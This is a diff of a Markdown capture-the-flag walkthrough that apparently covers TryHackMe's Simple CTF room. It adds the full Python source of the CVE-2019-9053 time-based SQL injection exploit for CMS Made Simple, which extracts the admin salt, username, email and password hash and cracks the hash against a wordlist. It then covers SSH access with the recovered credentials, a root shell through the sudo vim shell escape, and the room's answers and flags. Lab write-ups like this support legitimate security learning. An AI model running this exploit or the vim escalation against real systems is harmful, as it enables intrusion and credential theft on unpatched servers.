@@ -96,7 +96,7 @@ arp-scan -l
 
 ---
 
-## 📄 Raw Nmap Terminal Output
+##  Raw Nmap Terminal Output
 
 ```text
 ┌──(gokhan㉿kali)-[~]
@@ -231,8 +231,6 @@ The higher port, **2222/tcp**, is running an **SSH service**.
 ## Exploitation
 
 ### 3. What's the CVE you're using against the application?
-
-
 
 Now that we have identified an HTTP service on port `80`, let's enumerate the web server for hidden directories and application content using **DIRB or Gobuster**.
 
@@ -489,7 +487,6 @@ python3 exploit.py -u http://MACHINE_IP/simple/
 ```
 
 > **Note:** Some older Exploit-DB scripts were written for Python 2 and may produce errors when run with Python 3. They may require minor syntax updates or the appropriate Python version.
-**Note:** Some older Exploit-DB scripts were written for Python 2 and may not work with Python 3.
 
 **Quick solution:**
 
@@ -538,18 +535,198 @@ Username: mitch
 Password: secret
 ```
 
+## Source Code (`exploit.py`)
 
+```python
+#!/usr/bin/env python3
+# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
+# Date: 30-03-2019
+# Exploit Author: Daniele Scanu @ Certimeter Group
+# Python 3 Porting & Refactoring
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
+# Version: <= 2.2.9
+# CVE : CVE-2019-9053
 
-  
+import argparse
+import hashlib
+import time
+import requests
+from termcolor import colored, cprint
 
+parser = argparse.ArgumentParser(description="CMS Made Simple <= 2.2.9 SQL Injection Exploit (Python 3)")
+parser.add_argument('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
+parser.add_argument('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for cracking admin password")
+parser.add_argument('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)
 
+options = parser.parse_args()
 
+if not options.url:
+    print("[+] Specify a target URL")
+    print("[+] Example usage (no cracking): python3 exploit.py -u http://target-uri")
+    print("[+] Example usage (with cracking): python3 exploit.py -u http://target-uri -c -w /path-wordlist")
+    print("[+] Note: Adjust the TIME variable in script if needed (time-based SQLi).")
+    exit()
 
+url_vuln = options.url.rstrip('/') + '/moduleinterface.php?mact=News,m1_,default,0'
+session = requests.Session()
+dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
+flag = True
+password = ""
+temp_password = ""
+TIME = 1
+db_name = ""
+output = ""
+email = ""
+
+salt = ''
+wordlist = ""
+if options.wordlist:
+    wordlist += options.wordlist
+
+def crack_password():
+    global password, output, wordlist, salt
+    try:
+        with open(wordlist, 'r', encoding='latin-1') as wordlist_file:
+            for line in wordlist_file:
+                line = line.strip()
+                beautify_print_try(line)
+                to_hash = (str(salt) + line).encode('utf-8')
+                if hashlib.md5(to_hash).hexdigest() == password:
+                    output += "\n[+] Password cracked: " + line
+                    break
+    except FileNotFoundError:
+        output += "\n[-] Wordlist file not found!"
+
+def beautify_print_try(value):
+    global output
+    print("\033c", end="")
+    cprint(output, 'green', attrs=['bold'])
+    cprint('[*] Try: ' + value, 'red', attrs=['bold'])
+
+def beautify_print():
+    global output
+    print("\033c", end="")
+    cprint(output, 'green', attrs=['bold'])
+
+def dump_salt():
+    global flag, salt, output
+    ord_salt = ""
+    ord_salt_temp = ""
+    while flag:
+        flag = False
+        for i in range(0, len(dictionary)):
+            temp_salt = salt + dictionary[i]
+            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
+            beautify_print_try(temp_salt)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            r = session.get(url)
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            salt = temp_salt
+            ord_salt = ord_salt_temp
+    flag = True
+    output += '\n[+] Salt for password found: ' + salt
+
+def dump_password():
+    global flag, password, output
+    ord_password = ""
+    ord_password_temp = ""
+    while flag:
+        flag = False
+        for i in range(0, len(dictionary)):
+            temp_password = password + dictionary[i]
+            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
+            beautify_print_try(temp_password)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
+            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            r = session.get(url)
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            password = temp_password
+            ord_password = ord_password_temp
+    flag = True
+    output += '\n[+] Password found: ' + password
+
+def dump_username():
+    global flag, db_name, output
+    ord_db_name = ""
+    ord_db_name_temp = ""
+    while flag:
+        flag = False
+        for i in range(0, len(dictionary)):
+            temp_db_name = db_name + dictionary[i]
+            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
+            beautify_print_try(temp_db_name)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            r = session.get(url)
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            db_name = temp_db_name
+            ord_db_name = ord_db_name_temp
+    output += '\n[+] Username found: ' + db_name
+    flag = True
+
+def dump_email():
+    global flag, email, output
+    ord_email = ""
+    ord_email_temp = ""
+    while flag:
+        flag = False
+        for i in range(0, len(dictionary)):
+            temp_email = email + dictionary[i]
+            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
+            beautify_print_try(temp_email)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            r = session.get(url)
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            email = temp_email
+            ord_email = ord_email_temp
+    output += '\n[+] Email found: ' + email
+    flag = True
+
+if __name__ == "__main__":
+    dump_salt()
+    dump_username()
+    dump_email()
+    dump_password()
+
+    if options.cracking:
+        print(colored("[*] Attempting password crack...", "yellow"))
+        crack_password()
+
+    beautify_print()
+
+```
+
+---
 
 ### 6. Where can you login with the details obtained?
 
+<img width="935" height="164" alt="image" src="https://github.com/user-attachments/assets/6c5061d4-3ee2-49d1-8a1e-8154ba015696" />
 
-
+**Answer: SSH**
 
 
 ---
@@ -559,43 +736,109 @@ Password: secret
 ### 7. What's the user flag?
 
 
+#### SSH Authentication / Initial Access
+
+The target machine uses a non-standard SSH port (`2222`). Connect using the extracted credentials:
+
+* **Host:** `10.145.143.226`
+* **Port:** `2222`
+* **User:** `mitch`
+
+```bash
+# Connect via SSH on custom port
+ssh mitch@10.145.143.226 -p 2222
+
+```
+<img width="872" height="388" alt="image" src="https://github.com/user-attachments/assets/91995e2d-6a27-4fd0-a8eb-fd2d83ac51b1" />
 
 
 ### 8. Is there any other user in the home directory? What's its name?
+$ cd /home
+$ ls
+mitch  **sunbath**
 
-
-
-
+<img width="157" height="73" alt="image" src="https://github.com/user-attachments/assets/d7784e1e-cee3-46c4-ab12-ecd37b7c06f8" />
 
 ---
 
 ## Privilege Escalation
 
 ### 9. What can you leverage to spawn a privileged shell?
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/**vim**
 
-
-
-
-
+<img width="475" height="127" alt="image" src="https://github.com/user-attachments/assets/7c174692-37fc-484b-983f-2d93e89f3683" />
 
 ### 10. What's the root flag?
 
+## Privilege Escalation
 
+### 1. User Enumeration
 
+Check the home directory to identify system users:
 
+```bash
+cd /home
+ls
 
+```
 
+**Output:**
 
+```text
+mitch  sunbath
 
+```
 
+---
 
+### 2. Sudo Privileges Check
 
+Inspect current user's `sudo` privileges:
 
+```bash
+sudo -l
 
+```
 
+**Output:**
 
+```text
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
 
+```
 
+The user `mitch` can execute `/usr/bin/vim` as `root` without providing a password.
 
+---
 
+### 3. Root Exploitation (GTFOBins - Vim Escaping)
+
+Exploit the binary execution vector using Vim's shell escape feature:
+
+```bash
+sudo vim -c ':!/bin/sh'
+
+```
+
+---
+
+### 4. Root Flag Retrieval
+
+Verify root access and read the target flag:
+
+```console
+# whoami
+root
+
+# cd /root
+# ls
+root.txt
+
+# cat root.txt
+W3ll d0n3. You made it!
+
+```
 
